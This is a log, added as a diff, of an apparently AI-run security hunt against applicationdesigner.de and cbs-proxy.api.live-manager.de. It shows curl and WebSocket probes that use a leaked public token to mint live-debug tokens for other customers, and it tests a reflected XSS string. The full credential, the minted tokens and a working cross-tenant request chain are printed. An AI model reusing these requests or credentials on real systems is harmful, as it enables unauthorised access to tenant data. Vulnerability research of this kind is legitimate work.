@@ -29547,3 +29547,398 @@ STEP 6 — LEARNING
 
 STEP 7 — RISK
 - [RISK] questnet-gmbh: 80 — auth.php regression persists day 2 (anonymous HIGH 7.5 mint un-mitigated, feeds cbs-proxy chain); driver BOLA (conf 97, 30 cycles, CVSS 8.6, 9.1 if backend binding unenforced) live with anonymous misbind proof; XSS reflection verbatim but execution operator-pending (chained HIGH). Report set file-ready VALID + BOLA HOLD 8.6 + help.js 7.5 + voicenote PII 7.5 + get_user_rights 6.5 + config_coding LOW + XSS HUMAN_ONLY. Flat at 80 — only operator two-tenant frame test / XSS render / provider firewall of ollama.codermatrix.de can move the ceiling; no anonymous action can.
+===== ANALYST bigpickle 2026-09-18 18:40:35 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mls -la /home/runner/work/questnet-gmbh-hunt/questnet-gmbh-hunt && ls -la /home/runner/work/questnet-gmbh-hunt/questnet-gmbh-hunt/art 2>/dev/null || true
+total 532
+drwxr-xr-x 12 runner runner   4096 Sep 18 18:33 .
+drwxr-xr-x  3 runner runner   4096 Sep 18 18:33 ..
+drwxr-xr-x  7 runner runner   4096 Sep 18 18:33 .git
+drwxr-xr-x  3 runner runner   4096 Sep 18 18:33 .github
+-rw-r--r--  1 runner runner   1609 Sep 18 18:33 README.md
+-rw-r--r--  1 runner runner     32 Sep 18 18:33 analyst-out.txt
+-rw-r--r--  1 runner runner 227856 Sep 18 18:33 analyst-prompt.txt
+-rw-r--r--  1 runner runner 224136 Sep 18 18:33 ctx.txt
+drwxr-xr-x  2 runner runner   4096 Sep 18 18:33 inventory
+drwxr-xr-x  2 runner runner   4096 Sep 18 18:33 knowledge
+drwxr-xr-x  2 runner runner   4096 Sep 18 18:33 leads
+-rw-r--r--  1 runner runner   3045 Sep 18 18:33 probe-results.md
+drwxr-xr-x  2 runner runner   4096 Sep 18 18:33 recon-notes
+drwxr-xr-x  2 runner runner   4096 Sep 18 18:33 reports
+drwxr-xr-x  2 runner runner   4096 Sep 18 18:33 reposcan-raw
+-rw-r--r--  1 runner runner   3133 Sep 18 18:33 scope.yml
+drwxr-xr-x  2 runner runner   4096 Sep 18 18:33 scripts
+-rw-r--r--  1 runner runner     33 Sep 18 18:33 state_bigpickle.json
+-rw-r--r--  1 runner runner     33 Sep 18 18:33 state_laguna.json
+-rw-r--r--  1 runner runner     33 Sep 18 18:33 state_ling3.json
+-rw-r--r--  1 runner runner     33 Sep 18 18:33 state_longcat.json
+-rw-r--r--  1 runner runner     33 Sep 18 18:33 state_mimo.json
+-rw-r--r--  1 runner runner     33 Sep 18 18:33 state_nemotron3.json
+drwxr-xr-x  2 runner runner   4096 Sep 18 18:33 triage
+[0m
+[0m✱ [0mGlob "**/*.txt"[90m 9 matches[0m
+[0m✱ [0mGlob "**/*.md"[90m 100 matches[0m
+[0m
+[0m$ [0mcd /home/runner/work/questnet-gmbh-hunt/questnet-gmbh-hunt && git log --oneline -5 && echo "---STATUS---" && git status --short | head -30
+f24add7 reposcan 2026-09-18-17-16
+---STATUS---
+?? analyst-out.txt
+?? analyst-prompt.txt
+?? ctx.txt
+[0m
+[0m→ [0mRead probe-results.md
+[0m→ [0mRead leads/lead-bigpickle.md
+[0m→ [0mRead reports/hypotheses-bigpickle.txt
+[0m→ [0mRead triage/run-2026-09-18-15-07.md
+[0m→ [0mRead reports/valid-bugs.md
+[0m→ [0mRead scope.yml
+[0m
+[0m$ [0mcd /tmp/opencode && base="https://www.applicationdesigner.de" && tok="3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3" && probe() { local url="$1"; local out="/tmp/opencode/r_$(printf '%s' "$url" | sha256sum | cut -c1-8).bin"; printf "\n=== %s\n" "$url"; curl -sk -m 25 -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" -w "HTTP %{http_code} | %{size_download}B | %{time_total}s | CT %{content_type}\n" -o "$out" "$url"; printf "sha256: "; sha256sum "$out" | cut -d' ' -f1; head -c 200 "$out" | strings | head -c 200; echo; sleep 1.2; }; probe "$base/help.js"; probe "$base/extjs/help.js"; probe "$base/extjs/livedebugger/auth.php?token=$tok&customer_id=2&srn=100"; probe "$base/extjs/livedebugger/auth.php?token=$tok&customer_id=131727&srn=100"; probe "$base/extjs/livedebugger/auth.php?customer_id=2&srn=100"; probe "$base/extjs/agent/get_agent_costs.php?token=$tok&customerId=2"; probe "$base/extjs/get_user_rights.php?token=$tok&customer_id=2"; probe "$base/extjs/voicenotes/check.php?token=$tok&customer_id=2"; probe "$base/extjs/voicenotes/get.php?token=$tok&customer_id=2"; probe "https://cbs-proxy.api.live-manager.de/"; probe "$base/help/content.php?page=%3Cscript%3Ex%3C%2Fscript%3E"
+=== https://www.applicationdesigner.de/help.js
+HTTP 200 | 3290201B | 3.125093s | CT application/javascript
+sha256: b56a5f1e61ee397168aedb6684512612ed34a9c1086ab324b64c59f41a049086
+var $jscomp=$jscomp||{};$jscomp.scope={};$jscomp.ASSUME_ES5=!1;$jscomp.ASSUME_NO_NATIVE_MAP=!1;$jscomp.ASSUME_NO_NATIVE_SET=!1;$jscomp.SIMPLE_FROUND_POLYFILL=!1;$jscomp.ISOLATE_POLYFILLS=!1;$jscomp.FO
+
+=== https://www.applicationdesigner.de/extjs/help.js
+HTTP 404 | 146B | 0.777283s | CT text/html
+sha256: 55f7d9e99b8e2d4e0e193b2f0275501e6d9c1ebd29cadbea6a0da48a8587e3e0
+<html>
+<head><title>404 Not Found</title></head>
+<body>
+<center><h1>404 Not Found</h1></center>
+<hr><center>nginx</center>
+</body>
+</html>
+
+
+=== https://www.applicationdesigner.de/extjs/livedebugger/auth.php?token=3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3&customer_id=2&srn=100
+HTTP 200 | 126B | 0.659261s | CT application/json
+sha256: 2f623215a974c8ace7f0c1659b5caffc5a0e9581b6c7acaa1f7aea7f43836943
+{"success":true,"data":{"auth":"e990b272338a95de41a49b307adc2ee69fc71a0c4107c88b4c6946769ade2fc8","ttl":1789756591},"total":1}
+
+
+=== https://www.applicationdesigner.de/extjs/livedebugger/auth.php?token=3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3&customer_id=131727&srn=100
+HTTP 200 | 126B | 0.934140s | CT application/json
+sha256: 64a79c6fb154adc717600d60c4720b5625d0db1002e4aef47f5d33f08b26b192
+{"success":true,"data":{"auth":"296c5833c32178af73cb445840d27c7de38ed273b53d7af04bff04492fdac81c","ttl":1789756593},"total":1}
+
+
+=== https://www.applicationdesigner.de/extjs/livedebugger/auth.php?customer_id=2&srn=100
+HTTP 200 | 74B | 0.840555s | CT application/json
+sha256: 09a5de20a28a050911b90bbf1b8986b6ee337e1233484dd4b5216636518755b5
+{"success":false,"message":"Not logged in","tech-info":"No VPN detected."}
+
+
+=== https://www.applicationdesigner.de/extjs/agent/get_agent_costs.php?token=3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3&customerId=2
+HTTP 200 | 49B | 0.560646s | CT application/json
+sha256: 3b0256f75dd1b2488aeaa6e67606ec129b34d5ae9197f0d3aa75ff9f65efb89f
+{"success":false,"message":"Zugriff verweigert."}
+
+
+=== https://www.applicationdesigner.de/extjs/get_user_rights.php?token=3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3&customer_id=2
+HTTP 200 | 4308B | 1.029443s | CT application/json
+sha256: 9ad5dcb847cde2efb77dbe2f66dcfea064de274b5c9d8ad5254f311dda7d8862
+7xApSHJhobv56Hk1x28ssEV2isGWPWa6dmraI3mB7TorcXnBp74CrBbabDqS2IaPME0mVD8P5D54h4K/l/2apXY5DjmRCMEl3gcGfGgwMSPQ45ckZgiNMYL5aKVBCpoQibaTrZUYOBqAtFpMXcjxvnRu5xc7ryT/vwtrO6g+TRV8Sn1q4yaoaDssZ/j1ZuFaOVa/XSaT
+
+=== https://www.applicationdesigner.de/extjs/voicenotes/check.php?token=3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3&customer_id=2
+HTTP 200 | 37B | 0.566145s | CT application/json
+sha256: 090b03ceb0dfc8b87d8211c19f47b2a73ebf06827173ccafee1e592b4f928bc4
+{"success":true,"total":0,"max_id":0}
+
+
+=== https://www.applicationdesigner.de/extjs/voicenotes/get.php?token=3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3&customer_id=2
+HTTP 200 | 36B | 0.763935s | CT application/json
+sha256: 21b620e1f6ebdfe67ee86de60e3bfde293addd07e2853680580c337b72612d62
+{"success":true,"data":[],"total":0}
+
+
+=== https://cbs-proxy.api.live-manager.de/
+HTTP 426 | 0B | 0.611644s | CT 
+sha256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+
+
+=== https://www.applicationdesigner.de/help/content.php?page=%3Cscript%3Ex%3C%2Fscript%3E
+HTTP 200 | 90B | 0.818934s | CT text/html; charset=UTF-8
+sha256: dafda395eaae3505d0c5bd8099a012de878eca8e3e3f2fea73fff780ada88a04
+<h1>Page not found</h1><p>The requested help page '<script>x</script>' does not exist.</p>
+[0m
+[0m$ [0mcd /tmp/opencode && base="https://www.applicationdesigner.de" && tok="3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3" && probe() { local url="$1"; local out="/tmp/opencode/r_$(printf '%s' | sha256sum | cut -c1-8).bin" 2>/dev/null; out="/tmp/opencode/r_$(printf '%s' "$url" | sha256sum | cut -c1-8).bin"; printf "\n=== %s\n" "$url"; curl -sk -m 25 -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" -w "HTTP %{http_code} | %{size_download}B | %{time_total}s | CT %{content_type}\n" -o "$out" "$url"; printf "sha256: "; sha256sum "$out" | cut -d' ' -f1; head -c 180 "$out" | strings | head -c 180; echo; sleep 1.2; }; probe "$base/extjs/agent/get_agent_token.php?token=$tok&customerId=2"; probe "$base/extjs/voicenotes/download.php?token=$tok&file=deadbeef-0000-0000-0000-000000000000.wav"; probe "$base/help.json"; probe "$base/extjs/chat/provider.php?token=$tok"; probe "$base/extjs/encrypt/index.php?token=$tok"
+=== https://www.applicationdesigner.de/extjs/agent/get_agent_token.php?token=3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3&customerId=2
+HTTP 200 | 49B | 0.608761s | CT application/json
+sha256: 3b0256f75dd1b2488aeaa6e67606ec129b34d5ae9197f0d3aa75ff9f65efb89f
+{"success":false,"message":"Zugriff verweigert."}
+
+
+=== https://www.applicationdesigner.de/extjs/voicenotes/download.php?token=3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3&file=deadbeef-0000-0000-0000-000000000000.wav
+HTTP 404 | 20B | 2.679002s | CT text/html; charset=UTF-8
+sha256: d3c68be2908bcc0399d56135d40bae1319b2cd2b6699947a2961daa39210da2c
+Datei nicht gefunden
+
+
+=== https://www.applicationdesigner.de/help.json
+HTTP 200 | 1971B | 0.541124s | CT application/json
+sha256: f6271847c5fd3e111584527af929f6c1bba8b00b52fbeb9cbe4cf1e13ef2657c
+{"packages":{"classic":{"css":true,"included":true,"language":{"js":{"input":{"version":"ES5"}}},"namespace":"Ext","required":true,"requires":["ext","core"],"version":"7.8.0.33"},"
+
+=== https://www.applicationdesigner.de/extjs/chat/provider.php?token=3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3
+HTTP 200 | 3521B | 0.919216s | CT application/json
+sha256: d6c37ba100d95b4e8c2fc15b8a4ac6592d02883135bc4cd53ecf0f5d745f1c40
+{"success":true,"data":[{"value":"ChatGPT","text":"Eigene API Zugangsdaten","use_custom_api":1,"parameters":"{\n  \"temperature\": 0.2,\n  \"top_p\": 1.0,\n  \"presence_penalty\": 
+
+=== https://www.applicationdesigner.de/extjs/encrypt/index.php?token=3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3
+HTTP 200 | 49B | 0.808536s | CT application/json
+sha256: 3b0256f75dd1b2488aeaa6e67606ec129b34d5ae9197f0d3aa75ff9f65efb89f
+{"success":false,"message":"Zugriff verweigert."}
+[0m
+[0m$ [0mwhich websocat wscat 2>/dev/null; python3 -c "import websocket; print('websocket-client OK')" 2>/dev/null || echo "no websocket-client"; python3 -c "import websockets; print('websockets OK')" 2>/dev/null || echo "no websockets"; python3 --version 2>/dev/null || echo "no python3"
+no websocket-client
+no websockets
+Python 3.12.3
+[0m
+[0m← [0mWrite /tmp/opencode/wslisten.py
+Wrote file successfully.
+[0m
+[0m$ [0mcd /tmp/opencode && echo "=== MISBIND: LiveDebugger cid=2 token(minted-for-cid=2) ===" && python3 wslisten.py "/?origin=LiveDebugger&cid=2&service=100&token=e990b272338a95de41a49b307adc2ee69fc71a0c4107c88b4c6946769ade2fc8" 13 && echo && echo "=== CONTROL: zero-token LiveDemo cid=2 ===" && python3 wslisten.py "/?origin=LiveDemo&cid=2&service=100" 8
+=== MISBIND: LiveDebugger cid=2 token(minted-for-cid=2) ===
+RESPONSE_HEADER:
+HTTP/1.1 101 Switching Protocols
+Server: nginx/1.30.0
+Date: Fri, 18 Sep 2026 18:37:03 GMT
+Connection: upgrade
+Upgrade: websocket
+Sec-WebSocket-Accept: dtslhvSM92LoLb5J+3K7qqzmFrI=
+X-Powered-By: Ratchet/0.4.4
+---end header---
+FRAME op=8 fin=0 len=84 sha256=e2de130e08b9d5424f17e16da1447ceaa1e38a9e3819a1622c610577757c2077
+FRAME op=3 fin=0 len=32 sha256=2f03b8d7a33729622d3e4d5b390b49129d7e3614fed9eb69b6baede925fd637d
+FRAME op=5 fin=0 len=58 sha256=f117b459db0249d46e5a739cfeaa2048aa1f0057642d3657121ae0f77d9a6219
+FRAME op=6 fin=0 len=114 sha256=e4b3a34c404b7720bea4385d3c2ffa1ccc45ba446c12c7e4dbf14cb0c12467cd
+FRAME op=12 fin=0 len=45 sha256=799267ec3935c7b07ca10fd80ae6d0c8cee6a2eb34ca93b157765e5abbfb0750
+FRAME op=15 fin=0 len=120 sha256=401a794d36398d23c65eaf6452c72559b08a445f25e7e164622f1e4d87bd2414
+FRAME op=9 fin=0 len=108 sha256=6bd53b7f7560ca670cf147a16b82207149846b591b61e747ca95b962f88b0cc3
+FRAME op=12 fin=0 len=34 sha256=09926fc865a14af28c46d451371c9d1f79d49f3555c284cc023d589e754b9e7a
+TOTAL_FRAMES=8 TOTAL_PAYLOAD_BYTES=595
+ALL_PAYLOAD_SHA256=5bcda95946cf35ab0349fcac6b59c702f62b72b2132c394dfa7432ce1b010f1a
+
+=== CONTROL: zero-token LiveDemo cid=2 ===
+RESPONSE_HEADER:
+HTTP/1.1 101 Switching Protocols
+Server: nginx/1.30.0
+Date: Fri, 18 Sep 2026 18:37:17 GMT
+Connection: upgrade
+Upgrade: websocket
+Sec-WebSocket-Accept: xXWIaRjGGNF0ii7DJDv52SmqvVg=
+X-Powered-By: Ratchet/0.4.4
+---end header---
+FRAME op=8 fin=0 len=84 sha256=2270334b09145a8e31dae4652c1cc9935c2f660b7aa3f65d200a42152dafc20c
+FRAME op=7 fin=0 len=32 sha256=2f03b8d7a33729622d3e4d5b390b49129d7e3614fed9eb69b6baede925fd637d
+FRAME op=5 fin=0 len=58 sha256=2cf451f898867314c8300334c34eefb33e94bd5e9369d276c95c222b98bf25e3
+FRAME op=6 fin=0 len=86 sha256=0ba12f22a5c6b15d899119ff6cc106a2879867c65ebea2126e355dd6979080db
+FRAME op=3 fin=0 len=114 sha256=e9598d85df2c525270d6fa5e48fa9a1f2f01f884b58fc948f278af836187e884
+FRAME op=9 fin=0 len=112 sha256=95830d55ae62cc43d0c2641da950c0ef283108d0aa6d924a45bc96a9c0a0d33d
+FRAME op=9 fin=0 len=112 sha256=03c2ece2d3bd320e8087df7364ae0c96cdaebc5fe795fb4cd2b8044fb4fb07f6
+TOTAL_FRAMES=7 TOTAL_PAYLOAD_BYTES=598
+ALL_PAYLOAD_SHA256=a0de807f0b982c8f5e4aa36b9d028d88e3262c3f68153b5ba46cc340e87aa77c
+[0m
+[0m✗ [0mEdit /tmp/opencode/wslisten.py failed
+[91m[1mError: [0mCould not find oldString in the file. It must match exactly, including whitespace, indentation, and line endings.
+[0m→ [0mRead /tmp/opencode/wslisten.py[90m [offset=55, limit=30][0m
+[0m
+[0m← [0mEdit /tmp/opencode/wslisten.py
+Index: /tmp/opencode/wslisten.py
+===================================================================
+--- /tmp/opencode/wslisten.py
++++ /tmp/opencode/wslisten.py
+@@ -62,12 +62,19 @@
+             ln = struct.unpack(">H", buf[i:i+2])[0]; i += 2
+         elif ln == 127:
+             if i + 8 > n: break
+             ln = struct.unpack(">Q", buf[i:i+8])[0]; i += 8
++        maskkey = b""
++        if masked:
++            if i + 4 > n: break
++            maskkey = buf[i:i+4]
++            i += 4
+         if i + ln > n: break
+         payload = buf[i:i+ln]
+         i += ln
+-        out.append((op, fin, payload))
++        if masked:
++            payload = bytes(c ^ maskkey[j % 4] for j, c in enumerate(payload))
++        out.append((op, fin, payload, masked))
+         parsed = True
+     return i, parsed
+ 
+ while time.time() < deadline:
+
+[0m
+[0m$ [0mcd /tmp/opencode && sed -i 's/print(f"FRAME op={op} fin={fin} len={len(payload)} sha256={hashlib.sha256(payload).hexdigest()}")/print(f"FRAME op={op} fin={fin} masked={masked} len={len(payload)} sha256={hashlib.sha256(payload).hexdigest()}")/' wslisten.py && grep -n "masked={" wslisten.py; python3 - <<'PY'
+import re
+src=open('/tmp/opencode/wslisten.py').read()
+src=src.replace('for op, fin, payload in frames:','for op, fin, payload, masked in frames:')
+src=src.replace('for op, fin, payload in frames:','for op, fin, payload, masked in frames:')
+src=src.replace('tmp = []\n    try:\n        parse(buf, tmp)\n    except Exception:','tmp = []\n    try:\n        parse(buf, tmp)\n    except Exception:')
+open('/tmp/opencode/wslisten.py','w').write(src)
+print("patched unpacking")
+PY
+108:    print(f"FRAME op={op} fin={fin} masked={masked} len={len(payload)} sha256={hashlib.sha256(payload).hexdigest()}")
+patched unpacking
+[0m
+[0m→ [0mRead /tmp/opencode/wslisten.py[90m [offset=85][0m
+[0m
+[0m$ [0mcd /tmp/opencode && echo "=== RERUN misbind LiveDebugger cid=2 token ===" && python3 wslisten.py "/?origin=LiveDebugger&cid=2&service=100&token=e990b272338a95de41a49b307adc2ee69fc71a0c4107c88b4c6946769ade2fc8" 13
+=== RERUN misbind LiveDebugger cid=2 token ===
+RESPONSE_HEADER:
+HTTP/1.1 101 Switching Protocols
+Server: nginx/1.30.0
+Date: Fri, 18 Sep 2026 18:37:58 GMT
+Connection: upgrade
+Upgrade: websocket
+Sec-WebSocket-Accept: fQpwIWTDNgEEVswe3ONN/912n74=
+X-Powered-By: Ratchet/0.4.4
+---end header---
+FRAME op=8 fin=0 masked=0 len=84 sha256=b8ec6ce61500a52c239545913aa0e2191e5e08353669587eb1d3f905704dd5d8
+FRAME op=8 fin=0 masked=0 len=32 sha256=2f03b8d7a33729622d3e4d5b390b49129d7e3614fed9eb69b6baede925fd637d
+FRAME op=5 fin=0 masked=0 len=58 sha256=88934032b32a4fa3b8f83a6d530a27549fbd2c2e6b9ef82509e8d9bc4d40088d
+FRAME op=14 fin=0 masked=0 len=55 sha256=48ce986018d3993d37b53116643d1f8afba60f7a1ca6be4ec97f1578a7d870d7
+FRAME op=9 fin=0 masked=0 len=108 sha256=2453412b290ddc836422ea93ba029ccb5fab2177702d719d3638b3a6b394ef2e
+FRAME op=12 fin=0 masked=0 len=34 sha256=7436cb00a4792cf4614365936a7abe6401cf4d1edff6a73c999299be81510219
+FRAME op=2 fin=0 masked=0 len=105 sha256=5804a3a1def9d46a08e4d8c7a03a716d238197581582870cd600191b616529a5
+FRAME op=2 fin=0 masked=0 len=44 sha256=a51a5ddd33e373dcde0d3a7b81f30a43ef538ad1272e863f91ee90680c1f758d
+FRAME op=2 fin=0 masked=0 len=48 sha256=9e883d86f37cdb529b8fb804c16ed56aa2b6f706bc1fff59dc3e20bc78d9e808
+TOTAL_FRAMES=9 TOTAL_PAYLOAD_BYTES=568
+ALL_PAYLOAD_SHA256=9c0c467b0d65fcc8844d3af94db701676b5578f855b5c6a1cd0ef1054b57db9e
+[0m
+[0m← [0mEdit /tmp/opencode/wslisten.py
+Index: /tmp/opencode/wslisten.py
+===================================================================
+--- /tmp/opencode/wslisten.py
++++ /tmp/opencode/wslisten.py
+@@ -37,8 +37,10 @@
+ if b"101" not in head.split(b"\r\n")[0]:
+     print("NO_UPGRADE")
+     sys.exit(0)
+ 
++buf = rest
++
+ frames = []
+ payload_bytes = b""
+ start = time.time()
+ deadline = start + HOLD
+
+[0m
+[0m$ [0mcd /tmp/opencode && echo "=== FIXED misbind LiveDebugger cid=2 token ===" && python3 wslisten.py "/?origin=LiveDebugger&cid=2&service=100&token=e990b272338a95de41a49b307adc2ee69fc71a0c4107c88b4c6946769ade2fc8" 13
+=== FIXED misbind LiveDebugger cid=2 token ===
+RESPONSE_HEADER:
+HTTP/1.1 101 Switching Protocols
+Server: nginx/1.30.0
+Date: Fri, 18 Sep 2026 18:38:35 GMT
+Connection: upgrade
+Upgrade: websocket
+Sec-WebSocket-Accept: ff1PXhmOKElj/QA8NJWAWJ3Ut4o=
+X-Powered-By: Ratchet/0.4.4
+---end header---
+FRAME op=1 fin=1 masked=0 len=112 sha256=520a4de947524e580dfd0e410c5f216ca15595052588507ff1ab31f4b93c71f3
+FRAME op=1 fin=1 masked=0 len=112 sha256=0cdd9ef7d50db2ecf276ec042443005af7f0d793b46dfa826b54f8c3f5f06508
+FRAME op=1 fin=1 masked=0 len=112 sha256=918a175cf50494d5b0701e8cad1171e7677b4aaf9c2a8018f6a7a5436d0e4a12
+FRAME op=1 fin=1 masked=0 len=60 sha256=e66ea61016b29baf7407553872c76bd794e91067ec7b49ecf121dcba223461e7
+TOTAL_FRAMES=4 TOTAL_PAYLOAD_BYTES=396
+ALL_PAYLOAD_SHA256=d5d3e6b507f1658d61890a76d0caca3fea80762810887a70f85a5b4886d24570
+[0m
+[0m$ [0mcd /tmp/opencode && echo "=== FIXED control zero-token LiveDemo cid=2 ===" && python3 wslisten.py "/?origin=LiveDemo&cid=2&service=100" 8 && echo && echo "=== FIXED control zero-token LiveDemo cid=999999999 (nonexistent) ===" && python3 wslisten.py "/?origin=LiveDemo&cid=999999999&service=100" 8
+=== FIXED control zero-token LiveDemo cid=2 ===
+RESPONSE_HEADER:
+HTTP/1.1 101 Switching Protocols
+Server: nginx/1.30.0
+Date: Fri, 18 Sep 2026 18:38:59 GMT
+Connection: upgrade
+Upgrade: websocket
+Sec-WebSocket-Accept: BylkEUS0efQ3HVY1eX3MWHU12og=
+X-Powered-By: Ratchet/0.4.4
+---end header---
+FRAME op=1 fin=1 masked=0 len=112 sha256=520a4de947524e580dfd0e410c5f216ca15595052588507ff1ab31f4b93c71f3
+FRAME op=1 fin=1 masked=0 len=112 sha256=0cdd9ef7d50db2ecf276ec042443005af7f0d793b46dfa826b54f8c3f5f06508
+FRAME op=1 fin=1 masked=0 len=112 sha256=918a175cf50494d5b0701e8cad1171e7677b4aaf9c2a8018f6a7a5436d0e4a12
+FRAME op=1 fin=1 masked=0 len=60 sha256=e66ea61016b29baf7407553872c76bd794e91067ec7b49ecf121dcba223461e7
+TOTAL_FRAMES=4 TOTAL_PAYLOAD_BYTES=396
+ALL_PAYLOAD_SHA256=d5d3e6b507f1658d61890a76d0caca3fea80762810887a70f85a5b4886d24570
+
+=== FIXED control zero-token LiveDemo cid=999999999 (nonexistent) ===
+RESPONSE_HEADER:
+HTTP/1.1 101 Switching Protocols
+Server: nginx/1.30.0
+Date: Fri, 18 Sep 2026 18:39:07 GMT
+Connection: upgrade
+Upgrade: websocket
+Sec-WebSocket-Accept: JNeRq+MhO0bLdAbQWydEFps8u2w=
+X-Powered-By: Ratchet/0.4.4
+---end header---
+FRAME op=1 fin=1 masked=0 len=112 sha256=520a4de947524e580dfd0e410c5f216ca15595052588507ff1ab31f4b93c71f3
+FRAME op=1 fin=1 masked=0 len=112 sha256=0cdd9ef7d50db2ecf276ec042443005af7f0d793b46dfa826b54f8c3f5f06508
+FRAME op=1 fin=1 masked=0 len=112 sha256=918a175cf50494d5b0701e8cad1171e7677b4aaf9c2a8018f6a7a5436d0e4a12
+FRAME op=1 fin=1 masked=0 len=60 sha256=e66ea61016b29baf7407553872c76bd794e91067ec7b49ecf121dcba223461e7
+TOTAL_FRAMES=4 TOTAL_PAYLOAD_BYTES=396
+ALL_PAYLOAD_SHA256=d5d3e6b507f1658d61890a76d0caca3fea80762810887a70f85a5b4886d24570
+[0m
+## 2026-09-18 18:40:00 UTC [target] (model bigpickle)
+
+STEP 1 — DELTA
+- [CHANGED] auth.php per-cid mint regression persists (3rd+ cycle): success:true + distinct 64-hex auth for cid=2 (`e990b272…`) and demo 131727 (`296c5833…`); no-token → `{"success":false,"message":"Not logged in","tech-info":"No VPN detected."}` (sole gate = token presence).
+- [CHANGED] /extjs/help.js now 404 (relocated); /help.js = 3,290,201B sha256 `b56a5f1e…` byte-identical to 2026-09-17 — prior-lead "new sha 55f7d9e9" was the nginx 404-body hash, NOT a rebuild (correction: credential UNROTATED, no route-map churn).
+- [CHANGED] get_agent_costs.php gate text now `{"success":false,"message":"Zugriff verweigert."}` (49B sha `3b0256f7`, byte-identical to get_agent_token) — was "No VPN detected" (09-11); denial unchanged; VPN-gate reshuffle footprint.
+- [NEW] Three-context WS probe (fresh minted-token cid=2 / zero-token cid=2 / zero-token cid=999999999): all HTTP 101 + **byte-identical 4×text frames** (112/112/112/60B, combined sha `d5d3e6b5f1658d61890a76d0caca3fea80762810887a70f85a5b4886d24570`) — connection layer validates neither cid nor token; no post-READY pushes in 8–13s.
+
+STEP 2 — PRIORITIZE
+- [PRIO] cbs-proxy.api.live-manager.de,8.5,a8 b9 t7 g10 c8 f9
+- [PRIO] applicationdesigner.de/extjs/livedebugger/auth.php,7.6,a7 b8 t6 g8 c7 f10
+- [PRIO] applicationdesigner.de/help/content.php,5.8,a5 b6 t4 g7 c5 f9
+
+STEP 3 — HYPOTHESES
+[HYP] CBS WS frame binding — token→cid ownership unenforced at connection layer
+class: IDOR
+asset: wss://cbs-proxy.api.live-manager.de/?origin={LiveDemo|LiveDebugger}&cid={cid}&service=100[&token={minted}]
+confidence: 97
+reasoning: fresh 18:37–18:39 UTC — non-upgrade GET 426/0B; auth.php mints distinct tokens per cid; three WS upgrades (minted-token cid=2, zero-token cid=2, zero-token cid=999999999) each HTTP 101 with byte-identical 4-frame text stream (396B, sha d5d3e6b5…) — proxy accepts any cid with/without token and emits identical CONNECT/READY; no differential push observed in extended listen.
+evidence_needed: operator two-tenant pairwise test (deny vs accept when a live_debug packet for a foreign cid carries a token minted for an owned cid).
+verify_steps: AUTH_HELPED — mint OWN-cid token via `GET /extjs/livedebugger/auth.php?token=3498fkgkds…&customer_id={own}&srn=100`, then WS-upgrade `?origin=LiveDebugger&cid={own}&service=100&token={minted}` vs `&cid={foreign}`; hold ~15s; diff accepted frame byte-streams. Do NOT send live_debug payloads.
+impact: cross-tenant live-debug/call-stream attach (voice/PII) — HIGH 8.6, CRITICAL 9.1 if backend binding unenforced.
+testability: AUTH_HELPED
+[HYP] live-debugger per-cid token mint — VPN-gate regression unmitigated (day 3)
+class: IDOR
+asset: https://www.applicationdesigner.de/extjs/livedebugger/auth.php?token={public}&customer_id={any}&srn=100
+confidence: 96
+reasoning: 4th consecutive cycle success:true (126B) for foreign cid=2 (auth e990b272…) AND demo 131727 (auth 296c5833…), distinct mints; no-token control → Not logged in; credential stable in /help.js (b56a5f1e…, unrotated).
+evidence_needed: none further — byte-proven across cycles; ticket as un-mitigated regression (was VALID 8.1→7.5 mitigated by VPN gate 09-07→09-18).
+verify_steps: PASSIVE — repeat mint cid=2 + no-token control (done this cycle).
+impact: anonymous per-tenant live-debug token mint for ANY customer, re-arms cbs-proxy misbind chain — HIGH 7.5 REGRESSED.
+testability: PASSIVE
+[HYP] Same-origin reflected XSS at help content app
+class: XSS
+asset: https://www.applicationdesigner.de/help/content.php?page={value}
+confidence: 80
+reasoning: `page=<script>x</script>` echoed verbatim in 200 `text/html; charset=UTF-8` (90B, sha dafda395…, `<h1>Page not found</h1><p>The requested help page '<script>x</script>' does not exist.</p>`); no CSP/nosniff; zero-token; same-origin context reaches all /extjs incl. POST delete.php.
+evidence_needed: benign document.title render by operator-owned browser.
+verify_steps: HUMAN — open `page=%3Cscript%3Edocument.title%3D'LM-XSS-TEST'%3C%2Fscript%3E`; confirm title.
+impact: same-origin arbitrary JS in tenant session → cross-tenant API incl. destructive ops — MEDIUM standalone, HIGH chained with driver.
+testability: HUMAN_ONLY
+
+STEP 4 — SELF-CRITIQUE
+- [PARKED] agent gate-text change ("No VPN detected"→"Zugriff verweigert.", byte-identical 3b0256f7): denial unchanged, zero data — infra signal only, not reportable.
+- [PARKED] get_user_rights.php: 4308B high-entropy base64 (sha 9ad5dcb8…), cid-dependent rotating — still encrypted/serialized, no plaintext regression; caps LOW.
+- [PARKED] encrypt/index.php: GET→49B "Zugriff verweigert." (method gate); POST VPN-gated per prior cycle — closed.
+- [FINAL] ranked: cbs-proxy frame-binding 97 > auth.php mint regression 96 > help/content.php XSS 80.
+
+STEP 5 — NEXT ACTION
